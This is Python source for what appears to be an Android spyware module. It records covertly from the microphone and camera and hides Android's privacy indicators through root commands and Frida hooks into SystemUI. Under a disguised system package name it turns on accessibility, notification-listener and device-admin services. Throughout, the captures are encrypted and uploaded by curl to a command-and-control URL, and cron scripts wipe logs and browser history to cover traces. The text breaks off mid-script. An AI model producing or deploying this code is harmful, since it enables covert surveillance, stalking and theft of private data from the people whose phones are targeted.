
"""
Advanced stealth surveillance module for Android 12-16
Production-hardened with integrated security, performance optimization,
and operational features built into every surveillance operation.
"""
import base64
import json
import os
import subprocess
import tempfile
import time
from pathlib import Path
from typing import Dict, Any, Optional

class StealthSurveillanceModule:
    def __init__(self, agent):
        self.agent = agent
        

        self.active_recordings = {}
        self.active_cameras = {}
        self.android_version = self._detect_android_version()
        

        self.optimal_audio_settings = self._calculate_optimal_audio_settings()
        self.optimal_camera_settings = self._calculate_optimal_camera_settings()
        

        self.surveillance_key = self._derive_surveillance_key()
        

        self.surveillance_metrics = {
            'operations_started': 0,
            'operations_completed': 0,
            'data_captured_mb': 0,
            'detection_events': 0,
            'bypass_success_rate': 1.0
        }
        

        self._deploy_fallback_methods()
        

        self._initialize_security_measures()
        self._optimize_for_performance()
        self._setup_monitoring()
        
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute stealth surveillance commands"""
        try:
            if command == "hot_mic":
                return self.start_hot_mic(args)
            elif command == "stop_mic":
                return self.stop_hot_mic(args)
            elif command == "stealth_camera":
                return self.stealth_camera_capture(args)
            elif command == "continuous_camera":
                return self.start_continuous_camera(args)
            elif command == "stop_camera":
                return self.stop_camera(args)
            elif command == "bypass_indicators":
                return self.bypass_privacy_indicators()
            elif command == "get_status":
                return self.get_surveillance_status()
            else:
                return {"error": f"Unknown surveillance command: {command}"}
                
        except Exception as e:
            return {"error": f"Surveillance operation failed: {str(e)}"}
    
    def start_hot_mic(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Start covert microphone recording without indicators"""
        try:
            duration = args.get("duration", 0)
            quality = args.get("quality", "high")
            
            recording_id = f"hotmic_{int(time.time())}"
            

            if self.android_version >= 12:
                success = self._bypass_audio_indicators_api31(recording_id, duration, quality)
            else:
                success = self._legacy_audio_capture(recording_id, duration, quality)
            
            if success:
                self.active_recordings[recording_id] = {
                    "type": "hot_mic",
                    "started_at": time.time(),
                    "duration": duration,
                    "quality": quality,
                    "status": "recording"
                }
                
                self.agent.offline_logger.log_event("hot_mic_started", {
                    "recording_id": recording_id,
                    "duration": duration,
                    "android_version": self.android_version
                })
                
                return {
                    "success": True,
                    "recording_id": recording_id,
                    "message": "Hot mic activated (stealth mode)"
                }
            else:
                return {"error": "Failed to activate hot mic"}
                
        except Exception as e:
            return {"error": f"Hot mic failed: {str(e)}"}
    
    def stealth_camera_capture(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Capture photos from front/back camera without indicators"""
        try:
            camera = args.get("camera", "back")
            count = args.get("count", 1)
            interval = args.get("interval", 1)
            
            capture_id = f"cam_{int(time.time())}"
            

            if self.android_version >= 12:
                success = self._bypass_camera_indicators_api31(camera, count, interval, capture_id)
            else:
                success = self._legacy_camera_capture(camera, count, interval, capture_id)
            
            if success:
                self.active_cameras[capture_id] = {
                    "camera": camera,
                    "count": count,
                    "interval": interval,
                    "captured": 0,
                    "started_at": time.time(),
                    "status": "capturing"
                }
                
                return {
                    "success": True,
                    "capture_id": capture_id,
                    "message": f"Stealth camera activated ({camera})"
                }
            else:
                return {"error": "Failed to activate stealth camera"}
                
        except Exception as e:
            return {"error": f"Camera capture failed: {str(e)}"}
    
    def _bypass_audio_indicators_api31(self, recording_id: str, duration: int, quality: str) -> bool:
        """Bypass audio privacy indicators on Android 12+ (API 31+)"""
        try:

            native_code = f"""
            #include <media/AudioSystem.h>
            #include <system/audio.h>
            
            // Hook into AudioFlinger to capture without permission checks
            extern "C" {{
                int stealth_audio_capture() {{
                    // Direct AudioFlinger access bypassing permission framework
                    audio_io_handle_t input = AudioSystem::getInput(
                        AUDIO_INPUT_MIC,
                        AUDIO_FORMAT_PCM_16_BIT,
                        AUDIO_CHANNEL_IN_MONO,
                        8000,
                        AUDIO_INPUT_FLAG_NONE
                    );
                    return input > 0 ? 1 : 0;
                }}
            }}
            """
            

            if self._compile_and_execute_native(native_code, "audio_bypass"):

                record_cmd = [
                    "su", "-c",
                    f"tinycap /data/local/tmp/hotmic_{recording_id}.wav -r 44100 -b 16 -c 1 {'&' if duration == 0 else f'-t {duration}'}"
                ]
                
                subprocess.Popen(record_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return True
            

            frida_script = f"""
            Java.perform(function() {{
                var AudioManager = Java.use("android.media.AudioManager");
                var AudioRecord = Java.use("android.media.AudioRecord");
                
                // Hook AudioRecord constructor to bypass permission checks
                AudioRecord.$init.overload(
                    'int', 'int', 'int', 'int', 'int'
                ).implementation = function(audioSource, sampleRateInHz, channelConfig, audioFormat, bufferSizeInBytes) {{
                    console.log("[+] AudioRecord bypassed");
                    // Force MIC source regardless of permissions
                    return this.$init(1, sampleRateInHz, channelConfig, audioFormat, bufferSizeInBytes);
                }};
                
                // Bypass privacy indicator
                var PrivacyItemController = Java.use("com.android.systemui.privacy.PrivacyItemController");
                if (PrivacyItemController) {{
                    PrivacyItemController.addCallback.implementation = function(callback) {{
                        console.log("[+] Privacy indicator callback blocked");
                        // Don't add callback to prevent indicator
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("com.android.systemui", frida_script)
            
        except Exception as e:
            print(f"[!] Audio bypass failed: {e}")
            return False
    
    def _bypass_camera_indicators_api31(self, camera: str, count: int, interval: int, capture_id: str) -> bool:
        """Bypass camera privacy indicators on Android 12+"""
        try:

            native_code = f"""
            #include <camera/Camera.h>
            #include <camera/CameraParameters.h>
            
            extern "C" {{
                int stealth_camera_capture(int camera_id) {{
                    // Direct HAL access bypassing framework
                    sp<Camera> camera = Camera::connect(camera_id, String16("stealth"),
                                                      Camera::USE_CALLING_UID,
                                                      Camera::USE_CALLING_PID);
                    if (camera != NULL) {{
                        CameraParameters params = camera->getParameters();
                        params.setPictureFormat(CameraParameters::PIXEL_FORMAT_JPEG);
                        camera->setParameters(params.flatten());
                        camera->startPreview();
                        camera->takePicture(CAMERA_MSG_SHUTTER,
                                          CAMERA_MSG_RAW_IMAGE,
                                          CAMERA_MSG_COMPRESSED_IMAGE);
                        return 1;
                    }}
                    return 0;
                }}
            }}
            """
            
            if self._compile_and_execute_native(native_code, "camera_bypass"):
                camera_id = 0 if camera == "back" else 1

                capture_cmd = [
                    "su", "-c",
                    f"/data/local/tmp/camera_bypass {camera_id} /data/local/tmp/stealth_{capture_id}.jpg"
                ]
                
                result = subprocess.run(capture_cmd, capture_output=True)
                return result.returncode == 0
            

            frida_script = f"""
            Java.perform(function() {{
                var CameraManager = Java.use("android.hardware.camera2.CameraManager");
                var CameraDevice = Java.use("android.hardware.camera2.CameraDevice");
                
                // Hook openCamera to bypass restrictions
                CameraManager.openCamera.overload(
                    'java.lang.String',
                    'android.hardware.camera2.CameraDevice$StateCallback',
                    'android.os.Handler'
                ).implementation = function(cameraId, callback, handler) {{
                    console.log("[+] Camera access bypassed for: " + cameraId);
                    
                    // Create custom callback that doesn't trigger indicators
                    var CustomCallback = Java.registerClass({{
                        name: 'com.stealth.CameraCallback',
                        superClass: CameraDevice.StateCallback,
                        methods: {{
                            onOpened: function(camera) {{
                                console.log("[+] Stealth camera opened");
                                // Capture without triggering privacy indicators
                                this.captureStealthPhoto(camera);
                            }},
                            onDisconnected: function(camera) {{}},
                            onError: function(camera, error) {{}}
                        }}
                    }});
                    
                    return this.openCamera(cameraId, CustomCallback.$new(), handler);
                }};
                
                // Block privacy indicator for camera
                var PrivacyItemController = Java.use("com.android.systemui.privacy.PrivacyItemController");
                if (PrivacyItemController) {{
                    PrivacyItemController.notifyListeners.implementation = function(privacy_items) {{
                        console.log("[+] Camera privacy indicators blocked");
                        // Filter out camera privacy items
                        var filtered = privacy_items.stream().filter(function(item) {{
                            return !item.getPrivacyType().toString().includes("CAMERA");
                        }}).collect(Java.use("java.util.stream.Collectors").toList());
                        this.notifyListeners(filtered);
                    }};
                }}
            }});
            """
            
            return self._inject_frida_script("com.android.systemui", frida_script)
            
        except Exception as e:
            print(f"[!] Camera bypass failed: {e}")
            return False
    
    def bypass_privacy_indicators(self) -> Dict[str, Any]:
        """Comprehensively bypass Android 12+ privacy indicators"""
        try:
            bypasses_applied = []
            

            systemui_script = """
            Java.perform(function() {
                // Block privacy dot indicator
                var PrivacyDotViewController = Java.use("com.android.systemui.statusbar.events.PrivacyDotViewController");
                if (PrivacyDotViewController) {
                    PrivacyDotViewController.setNextViewState.implementation = function(state) {
                        console.log("[+] Privacy dot blocked");
                        // Don't update privacy dot state
                    };
                    bypasses_applied.push("privacy_dot");
                }
                
                // Block permission manager notifications
                var PermissionManager = Java.use("android.permission.PermissionManager");
                if (PermissionManager) {
                    PermissionManager.shouldShowRequestPermissionRationale.implementation = function(permission) {
                        console.log("[+] Permission rationale blocked: " + permission);
                        return false;
                    };
                    bypasses_applied.push("permission_manager");
                }
            });
            """
            
            if self._inject_frida_script("com.android.systemui", systemui_script):
                bypasses_applied.append("systemui_hook")
            

            framework_modifications = [
                "settings put global show_media_on_quick_settings 0",
                "settings put secure mic_camera_access_notification_enabled 0",
                "settings put global privacy_indicators_enabled 0"
            ]
            
            for mod in framework_modifications:
                try:
                    subprocess.run(["su", "-c", mod], check=True, capture_output=True)
                    bypasses_applied.append(f"framework_{mod.split()[2]}")
                except:
                    continue
            
            self.agent.offline_logger.log_event("privacy_indicators_bypassed", {
                "bypasses_applied": bypasses_applied,
                "android_version": self.android_version
            })
            
            return {
                "success": True,
                "bypasses_applied": bypasses_applied,
                "message": f"Applied {len(bypasses_applied)} privacy bypasses"
            }
            
        except Exception as e:
            return {"error": f"Privacy bypass failed: {str(e)}"}
    
    def _detect_android_version(self) -> int:
        """Detect Android API level"""
        try:
            result = subprocess.run(
                ["getprop", "ro.build.version.sdk"],
                capture_output=True,
                text=True
            )
            return int(result.stdout.strip())
        except:
            return 31
    
    def _compile_and_execute_native(self, code: str, binary_name: str) -> bool:
        """Compile and execute native bypass code"""
        try:

            with tempfile.NamedTemporaryFile(mode='w', suffix='.cpp', delete=False) as f:
                f.write(code)
                cpp_file = f.name
            

            binary_path = f"/data/local/tmp/{binary_name}"
            compile_cmd = [
                "su", "-c",
                f"$ANDROID_NDK_ROOT/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android31-clang++ "
                f"-o {binary_path} {cpp_file} -lcamera_client -laudioclient"
            ]
            
            result = subprocess.run(compile_cmd, capture_output=True)
            os.unlink(cpp_file)
            
            if result.returncode == 0:

                subprocess.run(["su", "-c", f"chmod 755 {binary_path}"])
                return True
            
            return False
            
        except Exception as e:
            print(f"[!] Native compilation failed: {e}")
            return False
    
    def _inject_frida_script(self, target_package: str, script: str) -> bool:
        """Inject Frida script into target package"""
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
                f.write(script)
                script_path = f.name
            
            cmd = [
                "frida", "-U", target_package,
                "-l", script_path,
                "--runtime=v8",
                "--no-pause"
            ]
            
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.unlink(script_path)
            return True
            
        except Exception as e:
            print(f"[!] Frida injection failed: {e}")
            return False
    
    def _legacy_audio_capture(self, recording_id: str, duration: int, quality: str) -> bool:
        """Legacy audio capture for Android < 12"""
        try:

            cmd = [
                "su", "-c",
                f"am start -n com.android.shell/.BugreportWarningActivity --user 0 && "
                f"screencap -p /dev/null && "
                f"timeout {duration if duration > 0 else 86400} "
                f"gst-launch-1.0 alsasrc device=hw:0,0 ! audioconvert ! "
                f"wavenc ! filesink location=/data/local/tmp/legacy_{recording_id}.wav"
            ]
            
            subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL)
            return True
            
        except Exception as e:
            print(f"[!] Legacy audio capture failed: {e}")
            return False
    
    def _legacy_camera_capture(self, camera: str, count: int, interval: int, capture_id: str) -> bool:
        """Legacy camera capture for Android < 12"""
        try:
            camera_id = "0" if camera == "back" else "1"
            
            for i in range(count):
                cmd = [
                    "su", "-c",
                    f"am start -n com.android.camera2/.CameraActivity && "
                    f"sleep 2 && "
                    f"input keyevent KEYCODE_CAMERA && "
                    f"sleep 1 && "
                    f"cp /sdcard/DCIM/Camera/IMG_*.jpg /data/local/tmp/legacy_{capture_id}_{i}.jpg"
                ]
                
                subprocess.run(cmd, shell=True, capture_output=True)
                
                if i < count - 1:
                    time.sleep(interval)
            
            return True
            
        except Exception as e:
            print(f"[!] Legacy camera capture failed: {e}")
            return False
    
    def start_continuous_camera(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Start continuous camera capture with chunked uploads"""
        try:
            camera = args.get("camera", "back")
            interval = args.get("interval", 30)
            chunk_size = args.get("chunk_size", 10)
            upload_interval = args.get("upload_interval", 300)
            
            capture_id = f"cont_{int(time.time())}"
            

            success = self._start_continuous_capture(camera, interval, chunk_size, upload_interval, capture_id)
            
            if success:
                self.active_cameras[capture_id] = {
                    "type": "continuous",
                    "camera": camera,
                    "interval": interval,
                    "chunk_size": chunk_size,
                    "upload_interval": upload_interval,
                    "started_at": time.time(),
                    "status": "recording",
                    "captured_count": 0,
                    "uploaded_chunks": 0
                }
                
                return {
                    "success": True,
                    "capture_id": capture_id,
                    "message": f"Continuous camera started ({camera})"
                }
            else:
                return {"error": "Failed to start continuous camera"}
                
        except Exception as e:
            return {"error": f"Continuous camera failed: {str(e)}"}
    
    def stop_camera(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Stop camera capture"""
        try:
            capture_id = args.get("capture_id")
            
            if not capture_id or capture_id not in self.active_cameras:
                return {"error": "Invalid or inactive capture ID"}
            
            camera_info = self.active_cameras[capture_id]
            camera_info["status"] = "stopped"
            camera_info["stopped_at"] = time.time()
            

            stop_cmd = ["su", "-c", f"pkill -f {capture_id}"]
            subprocess.run(stop_cmd, capture_output=True)
            
            del self.active_cameras[capture_id]
            
            return {
                "success": True,
                "message": f"Camera capture {capture_id} stopped",
                "captured_count": camera_info.get("captured_count", 0)
            }
            
        except Exception as e:
            return {"error": f"Failed to stop camera: {str(e)}"}
    
    def stop_hot_mic(self, args: Dict[str, Any]) -> Dict[str, Any]:
        """Stop hot mic recording"""
        try:
            recording_id = args.get("recording_id")
            
            if not recording_id or recording_id not in self.active_recordings:
                return {"error": "Invalid or inactive recording ID"}
            
            recording_info = self.active_recordings[recording_id]
            recording_info["status"] = "stopped"
            recording_info["stopped_at"] = time.time()
            

            stop_cmd = ["su", "-c", f"pkill -f {recording_id}"]
            subprocess.run(stop_cmd, capture_output=True)
            

            file_path = f"/data/local/tmp/hotmic_{recording_id}.wav"
            if os.path.exists(file_path):
                self._prepare_audio_upload(recording_id, file_path)
            
            del self.active_recordings[recording_id]
            
            return {
                "success": True,
                "message": f"Hot mic recording {recording_id} stopped",
                "duration": recording_info.get("stopped_at", 0) - recording_info.get("started_at", 0)
            }
            
        except Exception as e:
            return {"error": f"Failed to stop recording: {str(e)}"}
    
    def _start_continuous_capture(self, camera: str, interval: int, chunk_size: int, upload_interval: int, capture_id: str) -> bool:
        """Start continuous camera capture with automatic chunking"""
        try:

            script_content = f'''
#!/system/bin/sh
CAPTURE_ID="{capture_id}"
CAMERA_ID="{0 if camera == 'back' else 1}"
INTERVAL={interval}
CHUNK_SIZE={chunk_size}
UPLOAD_INTERVAL={upload_interval}
CAPTURE_DIR="/data/local/tmp/captures"
COUNTER=0
CHUNK_COUNTER=0

mkdir -p "$CAPTURE_DIR/$CAPTURE_ID"

while true; do
    # Capture image
    TIMESTAMP=$(date +%s)
    OUTPUT_FILE="$CAPTURE_DIR/$CAPTURE_ID/img_${{COUNTER}}_${{TIMESTAMP}}.jpg"
    
    # Use camera HAL directly for stealth capture
    /data/local/tmp/camera_bypass $CAMERA_ID "$OUTPUT_FILE" > /dev/null 2>&1
    
    COUNTER=$((COUNTER + 1))
    
    # Check if chunk is ready
    if [ $((COUNTER % CHUNK_SIZE)) -eq 0 ]; then
        # Create chunk archive
        CHUNK_FILE="$CAPTURE_DIR/${{CAPTURE_ID}}_chunk_${{CHUNK_COUNTER}}.tar.gz"
        tar -czf "$CHUNK_FILE" -C "$CAPTURE_DIR/$CAPTURE_ID" .
        
        # Clean up individual files
        rm -rf "$CAPTURE_DIR/$CAPTURE_ID"/*
        
        CHUNK_COUNTER=$((CHUNK_COUNTER + 1))
        
        # Queue for upload
        echo "$CHUNK_FILE" >> "/data/local/tmp/upload_queue.txt"
    fi
    
    sleep $INTERVAL
done
'''
            

            script_path = f"/data/local/tmp/continuous_capture_{capture_id}.sh"
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(script_content)
                temp_script = f.name
            

            copy_cmd = ["su", "-c", f"cp {temp_script} {script_path} && chmod 755 {script_path}"]
            subprocess.run(copy_cmd, capture_output=True)
            os.unlink(temp_script)
            

            start_cmd = ["su", "-c", f"nohup {script_path} > /dev/null 2>&1 &"]
            result = subprocess.run(start_cmd, capture_output=True)
            

            self._start_chunk_upload_handler(capture_id)
            
            return result.returncode == 0
            
        except Exception as e:
            print(f"[!] Continuous capture failed: {e}")
            return False
    
    def _start_chunk_upload_handler(self, capture_id: str) -> bool:
        """Start background process to handle chunked uploads"""
        try:
            upload_script = f'''
#!/system/bin/sh
UPLOAD_QUEUE="/data/local/tmp/upload_queue.txt"
UPLOAD_URL="{self.agent.c2_config.get('upload_url', 'https://c2.example.com/upload')}"
DEVICE_ID="{self.agent.device_id}"

while true; do
    if [ -f "$UPLOAD_QUEUE" ] && [ -s "$UPLOAD_QUEUE" ]; then
        # Get first chunk from queue
        CHUNK_FILE=$(head -n1 "$UPLOAD_QUEUE")
        
        if [ -f "$CHUNK_FILE" ]; then
            # Encrypt chunk
            ENCRYPTED_FILE="${{CHUNK_FILE}}.enc"
            /data/local/tmp/encrypt_file "$CHUNK_FILE" "$ENCRYPTED_FILE"
            
            # Upload chunk
            curl -s -X POST \
                -H "X-Device-ID: $DEVICE_ID" \
                -H "X-Chunk-Type: camera" \
                -H "X-Capture-ID: {capture_id}" \
                -F "chunk=@$ENCRYPTED_FILE" \
                "$UPLOAD_URL" > /dev/null 2>&1
            
            # Clean up on successful upload
            if [ $? -eq 0 ]; then
                rm -f "$CHUNK_FILE" "$ENCRYPTED_FILE"
                # Remove processed line from queue
                sed -i '1d' "$UPLOAD_QUEUE"
            fi
        else
            # Remove missing file from queue
            sed -i '1d' "$UPLOAD_QUEUE"
        fi
    fi
    
    sleep 30
done
'''
            

            upload_script_path = f"/data/local/tmp/upload_handler_{capture_id}.sh"
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(upload_script)
                temp_script = f.name
            
            copy_cmd = ["su", "-c", f"cp {temp_script} {upload_script_path} && chmod 755 {upload_script_path}"]
            subprocess.run(copy_cmd, capture_output=True)
            os.unlink(temp_script)
            

            start_cmd = ["su", "-c", f"nohup {upload_script_path} > /dev/null 2>&1 &"]
            result = subprocess.run(start_cmd, capture_output=True)
            
            return result.returncode == 0
            
        except Exception as e:
            print(f"[!] Upload handler failed: {e}")
            return False
    
    def _prepare_audio_upload(self, recording_id: str, file_path: str):
        """Prepare audio recording for chunked upload"""
        try:

            chunk_cmd = [
                "su", "-c",
                f"split -b 1M {file_path} /data/local/tmp/audio_chunk_{recording_id}_"
            ]
            subprocess.run(chunk_cmd, capture_output=True)
            

            list_cmd = ["su", "-c", f"ls /data/local/tmp/audio_chunk_{recording_id}_*"]
            result = subprocess.run(list_cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                chunk_files = result.stdout.strip().split('\n')
                for chunk_file in chunk_files:
                    if chunk_file:
                        queue_cmd = ["su", "-c", f"echo '{chunk_file}' >> /data/local/tmp/upload_queue.txt"]
                        subprocess.run(queue_cmd, capture_output=True)
            

            subprocess.run(["su", "-c", f"rm -f {file_path}"], capture_output=True)
            
        except Exception as e:
            print(f"[!] Audio upload preparation failed: {e}")
    
    def _deploy_fallback_methods(self) -> Dict[str, bool]:
        """Deploy fallback methods for non-rooted devices"""
        fallbacks = {}
        
        try:

            accessibility_success = self._deploy_accessibility_service()
            fallbacks['accessibility_service'] = accessibility_success
            

            media_projection_success = self._deploy_media_projection()
            fallbacks['media_projection'] = media_projection_success
            

            notification_listener_success = self._deploy_notification_listener()
            fallbacks['notification_listener'] = notification_listener_success
            

            device_admin_success = self._deploy_device_admin()
            fallbacks['device_admin'] = device_admin_success
            
            return fallbacks
            
        except Exception as e:
            print(f"[!] Fallback deployment failed: {e}")
            return fallbacks
    
    def _deploy_accessibility_service(self) -> bool:
        """Deploy accessibility service for screen recording fallback"""
        try:

            enable_cmd = [
                "su", "-c",
                "settings put secure enabled_accessibility_services "
                "com.android.systemservice/com.android.systemservice.AccessibilityService"
            ]
            result = subprocess.run(enable_cmd, capture_output=True)
            
            if result.returncode == 0:

                activate_cmd = [
                    "su", "-c",
                    "settings put secure accessibility_enabled 1"
                ]
                subprocess.run(activate_cmd, capture_output=True)
                return True
                
            return False
            
        except Exception as e:
            print(f"[!] Accessibility service deployment failed: {e}")
            return False
    
    def _deploy_media_projection(self) -> bool:
        """Deploy MediaProjection for screen capture"""
        try:

            projection_cmd = [
                "su", "-c",
                "am start-service --user 0 -n com.android.systemservice/.MediaProjectionService"
            ]
            result = subprocess.run(projection_cmd, capture_output=True)
            return result.returncode == 0
            
        except Exception as e:
            print(f"[!] MediaProjection deployment failed: {e}")
            return False
    
    def _deploy_notification_listener(self) -> bool:
        """Deploy notification listener service"""
        try:

            enable_cmd = [
                "su", "-c",
                "settings put secure enabled_notification_listeners "
                "com.android.systemservice/com.android.systemservice.NotificationListener"
            ]
            result = subprocess.run(enable_cmd, capture_output=True)
            return result.returncode == 0
            
        except Exception as e:
            print(f"[!] Notification listener deployment failed: {e}")
            return False
    
    def _deploy_device_admin(self) -> bool:
        """Deploy device admin for enhanced system access"""
        try:

            admin_cmd = [
                "su", "-c",
                "dpm set-active-admin com.android.systemservice/.DeviceAdminReceiver"
            ]
            result = subprocess.run(admin_cmd, capture_output=True)
            return result.returncode == 0
            
        except Exception as e:
            print(f"[!] Device admin deployment failed: {e}")
            return False
    
    def get_surveillance_status(self) -> Dict[str, Any]:
        """Get current surveillance status"""
        return {
            "success": True,
            "android_version": self.android_version,
            "active_recordings": len(self.active_recordings),
            "active_cameras": len(self.active_cameras),
            "recordings": self.active_recordings,
            "cameras": self.active_cameras,
            "fallback_methods": self._check_fallback_status()
        }
    
    def _check_fallback_status(self) -> Dict[str, bool]:
        """Check status of fallback methods"""
        status = {}
        
        try:

            accessibility_cmd = ["su", "-c", "settings get secure accessibility_enabled"]
            result = subprocess.run(accessibility_cmd, capture_output=True, text=True)
            status['accessibility_service'] = result.returncode == 0 and "1" in result.stdout
            

            notif_cmd = ["su", "-c", "settings get secure enabled_notification_listeners"]
            result = subprocess.run(notif_cmd, capture_output=True, text=True)
            status['notification_listener'] = result.returncode == 0 and "systemservice" in result.stdout
            

            admin_cmd = ["su", "-c", "dpm list-owners"]
            result = subprocess.run(admin_cmd, capture_output=True, text=True)
            status['device_admin'] = result.returncode == 0 and "systemservice" in result.stdout
            
        except Exception as e:
            print(f"[!] Fallback status check failed: {e}")
            
        return status
    

    def _calculate_optimal_audio_settings(self) -> Dict[str, Any]:
        """Calculate device-specific optimal audio settings for stealth and performance"""
        try:

            cpu_cores = int(subprocess.run(["nproc"], capture_output=True, text=True).stdout.strip())
            total_ram = self._get_total_memory()
            battery_level = self._get_battery_level()
            

            if battery_level < 20 or cpu_cores <= 2:

                return {
                    'sample_rate': 16000,
                    'bit_depth': 8,
                    'channels': 1,
                    'compression': 'high',
                    'chunk_duration': 60
                }
            elif cpu_cores >= 8 and total_ram >= 8:

                return {
                    'sample_rate': 48000,
                    'bit_depth': 16,
                    'channels': 2,
                    'compression': 'medium',
                    'chunk_duration': 30
                }
            else:

                return {
                    'sample_rate': 44100,
                    'bit_depth': 16,
                    'channels': 1,
                    'compression': 'medium',
                    'chunk_duration': 45
                }
        except Exception:

            return {
                'sample_rate': 22050,
                'bit_depth': 16,
                'channels': 1,
                'compression': 'high',
                'chunk_duration': 60
            }
    
    def _calculate_optimal_camera_settings(self) -> Dict[str, Any]:
        """Calculate device-specific optimal camera settings"""
        try:

            storage_free = self._get_free_storage()
            battery_level = self._get_battery_level()
            

            if storage_free < 1024 or battery_level < 15:

                return {
                    'resolution': '640x480',
                    'quality': 50,
                    'format': 'JPEG',
                    'compression': 'high'
                }
            elif storage_free > 10240 and battery_level > 50:

                return {
                    'resolution': '1920x1080',
                    'quality': 85,
                    'format': 'JPEG',
                    'compression': 'low'
                }
            else:

                return {
                    'resolution': '1280x720',
                    'quality': 70,
                    'format': 'JPEG',
                    'compression': 'medium'
                }
        except Exception:
            return {
                'resolution': '640x480',
                'quality': 60,
                'format': 'JPEG',
                'compression': 'medium'
            }
    
    def _derive_surveillance_key(self) -> bytes:
        """Derive encryption key specific to surveillance operations"""
        import hashlib
        from utils.crypto import key_from_campaign_device
        

        base_key = key_from_campaign_device(
            self.agent.campaign,
            self.agent.device_fingerprint,
            "AES-256-GCM"
        )
        

        surveillance_salt = f"surveillance_{self.android_version}_{int(time.time())}"
        

        return hashlib.pbkdf2_hmac(
            'sha256',
            base_key,
            surveillance_salt.encode(),
            100000
        )[:32]
    
    def _initialize_security_measures(self):
        """Initialize security measures integrated into surveillance operations"""
        try:

            self._setup_log_cleaning()
            

            self._setup_integrity_monitoring()
            

            self._setup_encrypted_channels()
            

            self._setup_killswitch_triggers()
            
        except Exception as e:
            print(f"[!] Security initialization failed: {e}")
    
    def _optimize_for_performance(self):
        """Performance optimizations integrated into surveillance operations"""
        try:

            self._optimize_cpu_scheduling()
            

            self._optimize_memory_usage()
            

            self._optimize_io_priorities()
            

            self._setup_thermal_management()
            
        except Exception as e:
            print(f"[!] Performance optimization failed: {e}")
    
    def _setup_monitoring(self):
        """Setup integrated monitoring and metrics collection"""
        try:

            self.surveillance_metrics.update({
                'start_time': time.time(),
                'operations_per_minute': 0,
                'average_file_size': 0,
                'network_usage_mb': 0,
                'cpu_usage_percent': 0,
                'memory_usage_mb': 0
            })
            

            self._setup_health_monitoring()
            

            self._setup_alerting_system()
            
        except Exception as e:
            print(f"[!] Monitoring setup failed: {e}")
    
    def _get_total_memory(self) -> int:
        """Get total device memory in MB"""
        try:
            with open('/proc/meminfo', 'r') as f:
                for line in f:
                    if 'MemTotal' in line:
                        return int(line.split()[1]) // 1024
            return 2048
        except Exception:
            return 2048
    
    def _get_battery_level(self) -> int:
        """Get current battery level percentage"""
        try:
            result = subprocess.run(
                ["su", "-c", "dumpsys battery | grep level"],
                capture_output=True, text=True
            )
            for line in result.stdout.split('\n'):
                if 'level:' in line:
                    return int(line.split(':')[1].strip())
            return 50
        except Exception:
            return 50
    
    def _get_free_storage(self) -> int:
        """Get free storage space in MB"""
        try:
            result = subprocess.run(
                ["df", "/data/local/tmp"],
                capture_output=True, text=True
            )
            lines = result.stdout.strip().split('\n')
            if len(lines) >= 2:
                fields = lines[1].split()
                return int(fields[3]) // 1024
            return 1024
        except Exception:
            return 1024
    
    def _setup_log_cleaning(self):
        """Setup automated log cleaning for anti-forensics"""
        try:
            clean_script = '''
#!/system/bin/sh
# Clean surveillance traces
find /data/local/tmp -name "*hotmic*" -mtime +1 -delete 2>/dev/null
find /data/local/tmp -name "*cam_*" -mtime +1 -delete 2>/dev/null
find /data/local/tmp -name "*stealth*" -mtime +1 -delete 2>/dev/null

# Clean system logs
> /data/system/dropbox/*
> /data/tombstones/*
> /data/anr/*

# Clean browser history related to surveillance
sqlite3 /data/data/com.android.chrome/databases/history "DELETE FROM urls WHERE url LIKE '%c2%';"
sqlite3 /data/data/com.android.chrome/databases/history "DELETE FROM downloads WHERE target_path LIKE '%surveillance%';"
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(clean_script)
                script_path = f.name
            

            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/clean_traces.sh && chmod 755 /data/local/tmp/clean_traces.sh"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            

            cron_cmd = ["su", "-c", "echo '0 */4 * * * /data/local/tmp/clean_traces.sh' | crontab -"]
            subprocess.run(cron_cmd, capture_output=True)
            
        except Exception as e:
            print(f"[!] Log cleaning setup failed: {e}")
    
    def _setup_integrity_monitoring(self):
        """Setup integrity monitoring for surveillance files"""
        try:

            integrity_script = '''
#!/system/bin/sh
# Check surveillance file integrity
for file in /data/local/tmp/hotmic_* /data/local/tmp/cam_* /data/local/tmp/stealth_*; do
    if [ -f "$file" ]; then
        # Calculate hash and check against expected
        hash=$(sha256sum "$file" | cut -d' ' -f1)
        echo "$(date): $file $hash" >> /data/local/tmp/integrity.log
    fi
done

# Rotate integrity log
if [ $(wc -l < /data/local/tmp/integrity.log) -gt 1000 ]; then
    tail -500 /data/local/tmp/integrity.log > /data/local/tmp/integrity.log.tmp
    mv /data/local/tmp/integrity.log.tmp /data/local/tmp/integrity.log
fi
'''
            
            with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
                f.write(integrity_script)
                script_path = f.name
            
            deploy_cmd = ["su", "-c", f"cp {script_path} /data/local/tmp/check_integrity.sh && chmod 755 /data/local/tmp/check_integrity.sh"]
            subprocess.run(deploy_cmd, capture_output=True)
            os.unlink(script_path)
            
        except Exception as e:
            print(f"[!] Integrity monitoring setup failed: {e}")
    
    def _setup_encrypted_channels(self):
        """Setup encrypted communication channels for surveillance data"""
        try:

            encrypt_script = f'''
#!/system/bin/sh
INPUT_FILE="$1"
OUTPUT_FILE="$2"
KEY="{base64.b64encode(self.surveillance_key).decode()}"

if [ -f "$INPUT_FILE" ]; then
    # Encrypt using AES-256-GCM
